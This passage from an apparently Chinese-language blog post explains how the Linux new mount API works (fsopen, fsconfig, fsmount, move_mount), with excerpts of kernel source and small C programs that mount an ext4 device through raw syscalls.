fs_context_purpose purpose)</span><br>&#123;<br><span class="hljs-type">int</span> (*init_fs_context)(<span class="hljs-keyword">struct</span> fs_context *);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-type">int</span> ret = -ENOMEM;<br><br><span class="hljs-comment">// 分配 fs_context 结构体</span><br>fc = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc)<br><span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br><span class="hljs-comment">// 设置对应属性</span><br>fc-&gt;purpose= purpose;<br>fc-&gt;sb_flags= sb_flags;<br>fc-&gt;sb_flags_mask = sb_flags_mask;<br>fc-&gt;fs_type= get_filesystem(fs_type);<br>fc-&gt;cred= get_current_cred();<br>fc-&gt;net_ns= get_net(current-&gt;nsproxy-&gt;net_ns);<br><br>mutex_init(&amp;fc-&gt;uapi_mutex);<br><br><span class="hljs-comment">// 由 purpose 设置对应的命名空间</span><br><span class="hljs-keyword">switch</span> (purpose) &#123;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_MOUNT:<br>fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:<br><span class="hljs-type">atomic_inc</span>(&amp;reference-&gt;d_sb-&gt;s_active);<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br>fc-&gt;root = dget(reference);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> 让所有的文件系统无条件支持这块 */</span><br>init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;<br><span class="hljs-keyword">if</span> (!init_fs_context)<br>init_fs_context = legacy_init_fs_context;<br><br><span class="hljs-comment">// 初始化 fs_context</span><br>ret = init_fs_context(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br>fc-&gt;need_free = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">return</span> fc;<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ERR_PTR(ret);<br>&#125;<br></code></pre></td></tr></table></figure><p>在完成了通用的初始化工作后，最终进行具体文件系统对应初始化工作的其实是调用 <code>file_system_type</code> 中的 <code>init_fs_context</code> 函数指针对应的函数完成的，这里我们可以看到对于未设置 <code>init_fs_context</code> 的文件系统类型而言其最终会调用 <code>legacy_init_fs_context()</code> 进行初始化，主要就是为 <code>fs_context-&gt;fs_private</code> 分配一个 <code>legacy_fs_context</code> 结构体，并将 <code>fs_context</code> 的函数表设置为 <code>legacy_fs_context_ops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_init_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc)</span><br>&#123;<br>fc-&gt;fs_private = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> legacy_fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc-&gt;fs_private)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>fc-&gt;ops = &amp;legacy_fs_context_ops;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>legacy_fs_context</code> 结构体的定义如下，标识了一块指定长度与类型的缓冲区：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> &#123;</span><br><span class="hljs-type">char</span>*legacy_data;<span class="hljs-comment">/* Data page for legacy filesystems */</span><br><span class="hljs-type">size_t</span>data_size;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">legacy_fs_param</span><span class="hljs-title">param_type</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="Step-II-fsconfig-设置-filesystem-context-的相关参数与操作"><a href="#Step-II-fsconfig-设置-filesystem-context-的相关参数与操作" class="headerlink" title="Step.II - fsconfig: 设置 filesystem context 的相关参数与操作"></a>Step.II - fsconfig: 设置 filesystem context 的相关参数与操作</h3><p>在完成了空白的文件系统上下文的创建之后，我们还需要对其进行相应的配置，以便于后续的挂载操作，这个配置的功能对应到的就是 <code>fsconfig()</code> 系统调用</p><p> <code>fsconfig()</code> 系统调用根据不同的 cmd 进行不同的操作，对于挂载文件系统而言其核心操作主要就是两个 cmd：</p><ul><li><code>FSCONFIG_SET_STRING</code> ：设置不同的键值对参数</li><li><code>FSCONFIG_CMD_CREATE</code>：获得一个 superblock 并创建一个 root entry</li></ul><p>示例用法如下所示，这里创建了一个键值对 <code>&quot;source&quot;=/dev/sdb1</code> 表示文件系统源所在的设备名：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="✳-fsconfig-in-kernel"><a href="#✳-fsconfig-in-kernel" class="headerlink" title="✳ fsconfig() in kernel"></a>✳ fsconfig() in kernel</h4><p>内核空间中的 <code>fsconfig()</code> 实现比较长，但主要就是根据 cmd 进行各种 switch，这里就不贴完整的源码了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE5(fsconfig,<br><span class="hljs-type">int</span>, fd,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _key,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _value,<br><span class="hljs-type">int</span>, aux)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>.type= fs_value_is_undefined,<br>&#125;;<br><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br><span class="hljs-comment">// 主要是参数的各种检查</span><br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br>&#125;<br><br><span class="hljs-comment">// 获取文件描述符</span><br>f = fdget(fd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br>ret = -EINVAL;<br><span class="hljs-keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)<br><span class="hljs-keyword">goto</span> out_f;<br><br><span class="hljs-comment">// 获取 fs_context，存储在文件描述符的 private_data 字段</span><br>fc = f.file-&gt;private_data;<br><span class="hljs-keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;<br><span class="hljs-keyword">switch</span> (cmd) &#123; <span class="hljs-comment">// 一个操作都没实现</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>ret = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 拷贝 key 字段到内核空间</span><br><span class="hljs-keyword">if</span> (_key) &#123;<br>param.key = strndup_user(_key, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.key)) &#123;<br>ret = PTR_ERR(param.key);<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 根据不同的 cmd 进行 param 的不同设置</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-comment">// ...</span><br><span class="hljs-comment">// 我们主要关注这个 cmd</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>param.type = fs_value_is_string;<br>param.<span class="hljs-built_in">string</span> = strndup_user(_value, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.<span class="hljs-built_in">string</span>)) &#123;<br>ret = PTR_ERR(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br>param.size = <span class="hljs-built_in">strlen</span>(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 根据前面设置的 param 进行 VFS 相关操作</span><br>ret = vfs_fsconfig_locked(fc, cmd, &amp;param);<br>mutex_unlock(&amp;fc-&gt;uapi_mutex);<br>&#125;<br><br><span class="hljs-comment">/* Clean up the our record of any value that we obtained from</span><br><span class="hljs-comment"> * userspace.  Note that the value may have been stolen by the LSM or</span><br><span class="hljs-comment"> * filesystem, in which case the value pointer will have been cleared.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br><span class="hljs-comment">// 临时数据清理工作</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br>out_key:<br>kfree(param.key);<br>out_f:<br>fdput(f);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>fsconfig()</code> 的核心作用主要还是根据 cmd 进行参数的封装，最后进入到 VFS 中的操作则通过 <code>vfs_fsconfig_locked()</code> 完成</p><h3 id="Step-III-fsmount-获取一个挂载实例"><a href="#Step-III-fsmount-获取一个挂载实例" class="headerlink" title="Step.III - fsmount: 获取一个挂载实例"></a>Step.III - fsmount: 获取一个挂载实例</h3><p>完成了文件系统上下文的创建与配置，接下来终于来到文件系统的挂载操作了，<code>fsmount()</code> 系统调用用以获取一个可以被用以进行挂载的挂载实例，并返回一个文件描述符用以下一步的挂载</p><p>示例用法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-IV-move-mount-将挂载实例在挂载点间移动"><a href="#Step-IV-move-mount-将挂载实例在挂载点间移动" class="headerlink" title="Step.IV - move_mount: 将挂载实例在挂载点间移动"></a>Step.IV - move_mount: 将挂载实例在挂载点间移动</h3><p>最后来到<del>一个不统一以 fs 开头进行命名的</del> <code>move_mount()</code> 系统调用，其用以将挂载实例在挂载点间移动：</p><ul><li>对于尚未进行挂载的挂载实例而言，进行挂载的操作便是从空挂载点 <code>&quot;&quot;</code> 移动到对应的挂载点（例如 <code>&quot;/mnt/temp&quot;</code>），此时我们并不需要给出目的挂载点的 fd，而可以使用 <code>AT_FDCWD</code></li></ul><p>引入了 <code>move_mount()</code> 之后，我们最终的一个用以将 <code>&quot;/dev/sdb1&quot;</code> 以 <code>&quot;ext4&quot;</code> 文件系统挂载到 <code>&quot;/mnt/temp&quot;</code> 的完整示例程序如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_move_mount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_move_mount 429</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">move_mount</span><span class="hljs-params">(<span class="hljs-type">int</span> from_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *from_pathname,<span class="hljs-type">int</span> to_dfd, </span><br><span class="hljs-params">               <span class="hljs-type">const</span> <span class="hljs-type">char</span> *to_pathname, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_move_mount, from_dfd, from_pathname, to_dfd, to_pathname, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br>    move_mount(mount_fd, <span class="hljs-string">&quot;&quot;</span>, AT_FDCWD, <span class="hljs-string">&quot;/mnt/temp&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH);<br><br>    <span class="hljs-keyword">return</span> <span 